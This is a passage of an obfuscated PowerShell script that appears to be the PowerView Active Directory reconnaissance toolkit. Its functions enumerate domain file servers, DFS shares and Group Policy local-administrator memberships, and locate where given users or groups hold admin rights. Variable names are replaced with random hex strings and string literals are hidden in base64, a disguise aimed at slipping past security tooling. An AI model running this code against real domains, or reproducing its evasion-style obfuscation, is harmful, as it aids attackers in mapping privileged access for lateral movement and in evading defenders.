                        Get-NetGroupMember -c489e407a44b4d378d17e6f8021054c1 -afa30c601e734738b32424a6234484e4 ${b12c15582cce43a4ab90d2f8e2ab306a} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a0852a4c33684bf0877105c6da3a9074 ${a93a7a3a61c64d07a2f6770952369f81} -d722399685d842b19fa5d48261792164 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                    }
                }
            }
        }
    }
}
function Get-NetFileServer {
    [CmdletBinding()]
    param(
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String[]]
        ${bec7b23274ab4068b5f2614783a89d47},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    function SplitPath {
        param([String]${efe450d53b084f3cb286d6a758f6ee94})
        if (${efe450d53b084f3cb286d6a758f6ee94} -and (${efe450d53b084f3cb286d6a758f6ee94}.split("\\").Count -ge 3)) {
            ${19c69a43c106464fbf0fdd6b5df76a09} = ${efe450d53b084f3cb286d6a758f6ee94}.split("\\")[2]
            if(${19c69a43c106464fbf0fdd6b5df76a09} -and (${19c69a43c106464fbf0fdd6b5df76a09} -ne '')) {
                ${19c69a43c106464fbf0fdd6b5df76a09}
            }
        }
    }
    Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | ? {$_} | ? {
            if(${bec7b23274ab4068b5f2614783a89d47}) {
                ${bec7b23274ab4068b5f2614783a89d47} -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }
        } | ? {$_} | sort -Unique
}
function Get-DFSshare {
    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        ${cbf5732016674134a52944dfef8b4942} = "All",
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            ${afa30c601e734738b32424a6234484e4},
            [String]
            ${a3bf4f2494234d89b62febc9f379f624},
            [String]
            ${c4d5e29aa5ae43dc97a75d43cbc64f02},
            [ValidateRange(1,10000)] 
            [Int]
            ${c8e7665cd4cc41d88229c3536a114f1b} = 200
        )
        ${56cfb429c10e4267850750e004318b84} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(${56cfb429c10e4267850750e004318b84}) {
            ${4eeadfe92a7145d1acc649bbb0df3107} = @()
            ${56cfb429c10e4267850750e004318b84}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
            try {
                ${56cfb429c10e4267850750e004318b84}.FindAll() | ? {$_} | % {
                    ${d90960fc83614a2fb42f43ab6aac95a1} = $_.Properties
                    ${1d8d2aa48d3042a88adba935bf426658} = ${d90960fc83614a2fb42f43ab6aac95a1}.remoteservername
                    ${4eeadfe92a7145d1acc649bbb0df3107} += ${1d8d2aa48d3042a88adba935bf426658} | % {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=${d90960fc83614a2fb42f43ab6aac95a1}.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing DFS share : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Get-DFSshareV2 error : $_"
            }
            ${4eeadfe92a7145d1acc649bbb0df3107} | sort -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            ${afa30c601e734738b32424a6234484e4},
            [String]
            ${a3bf4f2494234d89b62febc9f379f624},
            [String]
            ${c4d5e29aa5ae43dc97a75d43cbc64f02},
            [ValidateRange(1,10000)] 
            [Int]
            ${c8e7665cd4cc41d88229c3536a114f1b} = 200
        )
        ${56cfb429c10e4267850750e004318b84} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(${56cfb429c10e4267850750e004318b84}) {
            ${4eeadfe92a7145d1acc649bbb0df3107} = @()
            ${56cfb429c10e4267850750e004318b84}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
            ${56cfb429c10e4267850750e004318b84}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
            try {
                ${56cfb429c10e4267850750e004318b84}.FindAll() | ? {$_} | % {
                    ${d90960fc83614a2fb42f43ab6aac95a1} = $_.Properties
                    ${32f9f2fd16b3419b9d93c128cea76620} = ${d90960fc83614a2fb42f43ab6aac95a1}.'msdfs-targetlistv2'[0]
                    ${3dfa0859ff5d4b758c2152938b650ff6} = [xml][System.Text.Encoding]::Unicode.GetString(${32f9f2fd16b3419b9d93c128cea76620}[2..(${32f9f2fd16b3419b9d93c128cea76620}.Length-1)])
                    ${4eeadfe92a7145d1acc649bbb0df3107} += ${3dfa0859ff5d4b758c2152938b650ff6}.targets.ChildNodes | % {
                        try {
                            ${eab79fc268cf4ef6887c94e1d4291fbe} = $_.InnerText
                            if ( ${eab79fc268cf4ef6887c94e1d4291fbe}.Contains('\') ) {
                                ${b5373abfc61649c79aebdeac5641dab6} = ${eab79fc268cf4ef6887c94e1d4291fbe}.split("\")[3]
                                ${c396c35cc88c4a94987c02a0f14a931d} = ${d90960fc83614a2fb42f43ab6aac95a1}.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="${b5373abfc61649c79aebdeac5641dab6}${c396c35cc88c4a94987c02a0f14a931d}";'RemoteServerName'=${eab79fc268cf4ef6887c94e1d4291fbe}.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing target : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Get-DFSshareV2 error : $_"
            }
            ${4eeadfe92a7145d1acc649bbb0df3107} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    ${4eeadfe92a7145d1acc649bbb0df3107} = @()
    if ( (${cbf5732016674134a52944dfef8b4942} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or (${cbf5732016674134a52944dfef8b4942}.endsWith("1")) ) {
        ${4eeadfe92a7145d1acc649bbb0df3107} += Get-DFSshareV1 -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    if ( (${cbf5732016674134a52944dfef8b4942} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or (${cbf5732016674134a52944dfef8b4942}.endsWith("2")) ) {
        ${4eeadfe92a7145d1acc649bbb0df3107} += Get-DFSshareV2 -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    ${4eeadfe92a7145d1acc649bbb0df3107} | sort -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
}
function Get-GptTmpl {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        ${d416eeaf422b4dc4a5730ec43e3129e2},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411}
    )
    begin {
        if(${d304e44efca5442daf28ae2e0a813411}) {
            ${076e36dda7734263a96704324ac1ecf0} = ${d416eeaf422b4dc4a5730ec43e3129e2}.split('\')
            ${7ef53f6d6c9446179cf68f433af42de1} = ${076e36dda7734263a96704324ac1ecf0}[0..(${076e36dda7734263a96704324ac1ecf0}.length-2)] -join '\'
            ${c2d0346f3c5149d2996b8185fb799893} = ${076e36dda7734263a96704324ac1ecf0}[-1]
            ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose "Mounting path ${d416eeaf422b4dc4a5730ec43e3129e2} using a temp PSDrive at ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            try {
                $Null = ndr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -PSProvider FileSystem -Root ${7ef53f6d6c9446179cf68f433af42de1}  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path ${d416eeaf422b4dc4a5730ec43e3129e2} : $_"
                return $Null
            }
            ${d416eeaf422b4dc4a5730ec43e3129e2} = ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} + ":\" + ${c2d0346f3c5149d2996b8185fb799893}
        } 
    }
    process {
        ${50963e0f969644d7a6d4b71eff4e3065} = ''
        ${c11ac73d992e4351aa6e14347e9a8e31} = @{}
        ${30ee7ee61ffb435db8a237096a4da679} = @{}
        try {
            if(Test-Path ${d416eeaf422b4dc4a5730ec43e3129e2}) {
                Write-Verbose "Parsing ${d416eeaf422b4dc4a5730ec43e3129e2}"
                gc ${d416eeaf422b4dc4a5730ec43e3129e2} -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {
                        ${50963e0f969644d7a6d4b71eff4e3065} = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        ${076e36dda7734263a96704324ac1ecf0} = $_.split('=')
                        ${b8c9b0f5b9a24ff48dcb758828e4213f} = ${076e36dda7734263a96704324ac1ecf0}[0].trim()
                        ${9887100ed4e140498fcb648c7cc2aad2} = ${076e36dda7734263a96704324ac1ecf0}[1].trim()
                        if(${9887100ed4e140498fcb648c7cc2aad2} -match ',') {
                            ${9887100ed4e140498fcb648c7cc2aad2} = ${9887100ed4e140498fcb648c7cc2aad2}.split(',')
                        }
                        if(!${c11ac73d992e4351aa6e14347e9a8e31}[${50963e0f969644d7a6d4b71eff4e3065}]) {
                            ${c11ac73d992e4351aa6e14347e9a8e31}.Add(${50963e0f969644d7a6d4b71eff4e3065}, @{})
                        }
                        ${c11ac73d992e4351aa6e14347e9a8e31}[${50963e0f969644d7a6d4b71eff4e3065}].Add( ${b8c9b0f5b9a24ff48dcb758828e4213f}, ${9887100ed4e140498fcb648c7cc2aad2} )
                    }
                }
                ForEach ($Section in ${c11ac73d992e4351aa6e14347e9a8e31}.keys) {
                    ${30ee7ee61ffb435db8a237096a4da679}[$Section] = New-Object PSObject -Property ${c11ac73d992e4351aa6e14347e9a8e31}[$Section]
                }
                New-Object PSObject -Property ${30ee7ee61ffb435db8a237096a4da679}
            }
        }
        catch {
            Write-Debug "Error parsing ${d416eeaf422b4dc4a5730ec43e3129e2} : $_"
        }
    }
    end {
        if(${d304e44efca5442daf28ae2e0a813411} -and ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}) {
            Write-Verbose "Removing temp PSDrive ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            gdr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -ErrorAction SilentlyContinue | rdr
        }
    }
}
function Get-GroupsXML {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        ${dab7cfda112a46c1a48a1c498596aa02},
        [Switch]
        ${bbdf9ae2b8734a70ab6da234f7f977d1},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411}
    )
    begin {
        if(${d304e44efca5442daf28ae2e0a813411}) {
            ${076e36dda7734263a96704324ac1ecf0} = ${dab7cfda112a46c1a48a1c498596aa02}.split('\')
            ${7ef53f6d6c9446179cf68f433af42de1} = ${076e36dda7734263a96704324ac1ecf0}[0..(${076e36dda7734263a96704324ac1ecf0}.length-2)] -join '\'
            ${c2d0346f3c5149d2996b8185fb799893} = ${076e36dda7734263a96704324ac1ecf0}[-1]
            ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose "Mounting path ${dab7cfda112a46c1a48a1c498596aa02} using a temp PSDrive at ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            try {
                $Null = ndr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -PSProvider FileSystem -Root ${7ef53f6d6c9446179cf68f433af42de1}  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path ${dab7cfda112a46c1a48a1c498596aa02} : $_"
                return $Null
            }
            ${dab7cfda112a46c1a48a1c498596aa02} = ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} + ":\" + ${c2d0346f3c5149d2996b8185fb799893}
        } 
    }
    process {
        if(Test-Path ${dab7cfda112a46c1a48a1c498596aa02}) {
            [xml] $GroupsXMLcontent = gc ${dab7cfda112a46c1a48a1c498596aa02}
            $GroupsXMLcontent | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
                ${cece1f195f3049e48a567091c9433159} = @()
                ${2cf298817834419788010da9d766e5d8} = @()
                ${7d77ae4ef4164464be811769bc637da5} = $_.Properties.GroupSid
                if(!${7d77ae4ef4164464be811769bc637da5}) {
                    if($_.Properties.groupName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        ${7d77ae4ef4164464be811769bc637da5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif($_.Properties.groupName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        ${7d77ae4ef4164464be811769bc637da5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    else {
                        ${7d77ae4ef4164464be811769bc637da5} = $_.Properties.groupName
                    }
                }
                ${2cf298817834419788010da9d766e5d8} = @(${7d77ae4ef4164464be811769bc637da5})
                $_.Properties.members | % {
                    $_ | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                        if($_.sid) {
                            ${cece1f195f3049e48a567091c9433159} += $_.sid
                        }
                        else {
                            ${cece1f195f3049e48a567091c9433159} += $_.name
                        }
                    }
                }
                if (${cece1f195f3049e48a567091c9433159} -or ${2cf298817834419788010da9d766e5d8}) {
                    ${cc50ec12ea7f437d849d9ece323f1477} = $_.filters | % {
                        $_ | select -ExpandProperty Filter* | % {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    if(${bbdf9ae2b8734a70ab6da234f7f977d1}) {
                        ${2cf298817834419788010da9d766e5d8} = ${2cf298817834419788010da9d766e5d8} | % {Convert-SidToName $_}
                        ${cece1f195f3049e48a567091c9433159} = ${cece1f195f3049e48a567091c9433159} | % {Convert-SidToName $_}
                    }
                    if(${2cf298817834419788010da9d766e5d8} -isnot [system.array]) {${2cf298817834419788010da9d766e5d8} = @(${2cf298817834419788010da9d766e5d8})}
                    if(${cece1f195f3049e48a567091c9433159} -isnot [system.array]) {${cece1f195f3049e48a567091c9433159} = @(${cece1f195f3049e48a567091c9433159})}
                    ${b058a9afc6e84aa9ba69ab72acba9704} = @{
                        'GPODisplayName' = ${03a560dbb4aa4739953c2cec415c953c}
                        'GPOName' = ${b99c1bd656aa46308141ed59f80f7353}
                        'GPOPath' = ${dab7cfda112a46c1a48a1c498596aa02}
                        'Filters' = ${cc50ec12ea7f437d849d9ece323f1477}
                        'MemberOf' = ${2cf298817834419788010da9d766e5d8}
                        'Members' = ${cece1f195f3049e48a567091c9433159}
                    }
                    New-Object -TypeName PSObject -Property ${b058a9afc6e84aa9ba69ab72acba9704}
                }
            }
        }
    }
    end {
        if(${d304e44efca5442daf28ae2e0a813411} -and ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}) {
            Write-Verbose "Removing temp PSDrive ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            gdr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -ErrorAction SilentlyContinue | rdr
        }
    }
}
function Get-NetGPO {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${b99c1bd656aa46308141ed59f80f7353} = '*',
        [String]
        ${b934f43212074817bf981181ee742c11},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${065f15a182554aaabaf7893f7e73219c} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if (${065f15a182554aaabaf7893f7e73219c}) {
            if(${b934f43212074817bf981181ee742c11}) {
                ${065f15a182554aaabaf7893f7e73219c}.filter="(&(objectCategory=groupPolicyContainer)(displayname=${b934f43212074817bf981181ee742c11}))"
            }
            else {
                ${065f15a182554aaabaf7893f7e73219c}.filter="(&(objectCategory=groupPolicyContainer)(name=${b99c1bd656aa46308141ed59f80f7353}))"
            }
            ${065f15a182554aaabaf7893f7e73219c}.FindAll() | ? {$_} | % {
                Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
            }
        }
    }
}
function Get-NetGPOGroup {
    [CmdletBinding()]
    Param (
        [String]
        ${b99c1bd656aa46308141ed59f80f7353} = '*',
        [String]
        ${b934f43212074817bf981181ee742c11},
        [Switch]
        ${bbdf9ae2b8734a70ab6da234f7f977d1},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    Get-NetGPO -b99c1bd656aa46308141ed59f80f7353 ${b99c1bd656aa46308141ed59f80f7353} -b934f43212074817bf981181ee742c11 ${b99c1bd656aa46308141ed59f80f7353} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | Foreach-Object {
        ${2cf298817834419788010da9d766e5d8} = $Null
        ${cece1f195f3049e48a567091c9433159} = $Null
        ${03a560dbb4aa4739953c2cec415c953c} = $_.displayname
        ${b99c1bd656aa46308141ed59f80f7353} = $_.name
        ${a5e7038675f54147b475f21225862b28} = $_.gpcfilesyspath
        ${92495dd11f2f46628343d47b31349dc0} =  @{
            'GptTmplPath' = "${a5e7038675f54147b475f21225862b28}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
        }
        ${cd1643194e88483bb532f05634d5d45b} = Get-GptTmpl @92495dd11f2f46628343d47b31349dc0
        if(${cd1643194e88483bb532f05634d5d45b}.GroupMembership) {
            ${2cf298817834419788010da9d766e5d8} = ${cd1643194e88483bb532f05634d5d45b}.GroupMembership | gm *Memberof | % { ${cd1643194e88483bb532f05634d5d45b}.GroupMembership.($_.name) } | % { $_.trim('*') }
            ${cece1f195f3049e48a567091c9433159} = ${cd1643194e88483bb532f05634d5d45b}.GroupMembership | gm *Members | % { ${cd1643194e88483bb532f05634d5d45b}.GroupMembership.($_.name) } | % { $_.trim('*') }
            if (${cece1f195f3049e48a567091c9433159} -or ${2cf298817834419788010da9d766e5d8}) {
                if(!${2cf298817834419788010da9d766e5d8}) {
                    ${2cf298817834419788010da9d766e5d8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                }
                if(${bbdf9ae2b8734a70ab6da234f7f977d1}) {
                    ${2cf298817834419788010da9d766e5d8} = ${2cf298817834419788010da9d766e5d8} | % {Convert-SidToName $_}
                    ${cece1f195f3049e48a567091c9433159} = ${cece1f195f3049e48a567091c9433159} | % {Convert-SidToName $_}
                }
                if(${2cf298817834419788010da9d766e5d8} -isnot [system.array]) {${2cf298817834419788010da9d766e5d8} = @(${2cf298817834419788010da9d766e5d8})}
                if(${cece1f195f3049e48a567091c9433159} -isnot [system.array]) {${cece1f195f3049e48a567091c9433159} = @(${cece1f195f3049e48a567091c9433159})}
                ${b058a9afc6e84aa9ba69ab72acba9704} = @{
                    'GPODisplayName' = ${03a560dbb4aa4739953c2cec415c953c}
                    'GPOName' = ${b99c1bd656aa46308141ed59f80f7353}
                    'GPOPath' = ${a5e7038675f54147b475f21225862b28}
                    'Filters' = $Null
                    'MemberOf' = ${2cf298817834419788010da9d766e5d8}
                    'Members' = ${cece1f195f3049e48a567091c9433159}
                }
                New-Object -TypeName PSObject -Property ${b058a9afc6e84aa9ba69ab72acba9704}
            }
        }
        ${92495dd11f2f46628343d47b31349dc0} =  @{
            'GroupsXMLpath' = "${a5e7038675f54147b475f21225862b28}\MACHINE\Preferences\Groups\Groups.xml"
            'ResolveSids' = ${bbdf9ae2b8734a70ab6da234f7f977d1}
            'UsePSDrive' = ${d304e44efca5442daf28ae2e0a813411}
        }
        Get-GroupsXML @92495dd11f2f46628343d47b31349dc0
    }
}
function Find-GPOLocation {
    [CmdletBinding()]
    Param (
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${cfa166c27b774b7fb2a8aa4298b6f647} = 'Administrators',
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    if(${dfa85e24773f431f91e73de068d7b94e}) {
        ${d98950af3033419194b20c9afd35b025} = Get-NetUser -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        ${1766b0e2ff5040fbb40789f9fe172f75} = ${d98950af3033419194b20c9afd35b025}.objectsid
        if(!${1766b0e2ff5040fbb40789f9fe172f75}) {    
            Throw "User '${dfa85e24773f431f91e73de068d7b94e}' not found!"
        }
        ${ac94da6a0ad840b490739412fd8209c4} = ${1766b0e2ff5040fbb40789f9fe172f75}
        ${7bb94567d4954c60aa308f6d329d175c} = ${d98950af3033419194b20c9afd35b025}.samaccountname
        ${9c7046bb5a6c490ca7006886a4af9b17} = ${d98950af3033419194b20c9afd35b025}.distinguishedname
    }
    elseif(${a0852a4c33684bf0877105c6da3a9074}) {
        ${e84898b3b02d436697861293d1bb9448} = Get-NetGroup -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        ${76c047048c844c1a9c711d939cbe59eb} = ${e84898b3b02d436697861293d1bb9448}.objectsid
        if(!${76c047048c844c1a9c711d939cbe59eb}) {    
            Throw "Group '${a0852a4c33684bf0877105c6da3a9074}' not found!"
        }
        ${ac94da6a0ad840b490739412fd8209c4} = ${76c047048c844c1a9c711d939cbe59eb}
        ${7bb94567d4954c60aa308f6d329d175c} = ${e84898b3b02d436697861293d1bb9448}.samaccountname
        ${9c7046bb5a6c490ca7006886a4af9b17} = ${e84898b3b02d436697861293d1bb9448}.distinguishedname
    }
    else {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBVAHMAZQByAE4AYQBtAGUAIABvAHIAIAAtAEcAcgBvAHUAcABOAGEAbQBlACAAbQB1AHMAdAAgAGIAZQAgAHMAcABlAGMAaQBmAGkAZQBkACEA')))
    }
    if(${cfa166c27b774b7fb2a8aa4298b6f647} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAGQAbQBpAG4AKgA=')))) {
        ${7d77ae4ef4164464be811769bc637da5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
    }
    elseif ( (${cfa166c27b774b7fb2a8aa4298b6f647} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAEQAUAAqAA==')))) -or (${cfa166c27b774b7fb2a8aa4298b6f647} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAGUAbQBvAHQAZQAqAA==')))) ) {
        ${7d77ae4ef4164464be811769bc637da5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
    }
    elseif (${cfa166c27b774b7fb2a8aa4298b6f647} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1ACoA')))) {
        ${7d77ae4ef4164464be811769bc637da5} = ${cfa166c27b774b7fb2a8aa4298b6f647}
    }
    else {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEcAcgBvAHUAcAAgAG0AdQBzAHQAIABiAGUAIAAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAnACwAIAAnAFIARABQACcALAAgAG8AcgAgAGEAIAAnAFMALQAxAC0ANQAtAFgAJwAgAHQAeQBwAGUAIABzAGkAZAAuAA==')))
    }
    Write-Verbose "LocalSid: ${7d77ae4ef4164464be811769bc637da5}"
    Write-Verbose "TargetSid: ${ac94da6a0ad840b490739412fd8209c4}"
    Write-Verbose "TargetObjectDistName: ${9c7046bb5a6c490ca7006886a4af9b17}"
    if(${ac94da6a0ad840b490739412fd8209c4} -isnot [system.array]) { ${ac94da6a0ad840b490739412fd8209c4} = @(${ac94da6a0ad840b490739412fd8209c4}) }
